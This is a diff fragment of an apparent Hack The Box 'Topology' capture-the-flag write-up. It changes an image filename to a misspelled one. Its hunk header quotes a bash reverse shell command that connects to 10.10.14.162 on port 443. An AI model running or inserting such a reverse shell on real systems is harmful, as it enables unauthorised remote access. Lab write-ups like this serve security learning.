@@ -210,7 +210,7 @@ system "bash -c 'bash -i >& /dev/tcp/10.10.14.162/443 0>&1'"
 
 Nice, we can now grab the final flag:
 
-![htb_topology_root.png](../assets/topology_assets/htb_topology_root.png)
+![htb_tolology_root.png](../assets/topology_assets/htb_tolology_root.png)
 
 Thanks for following along!
 
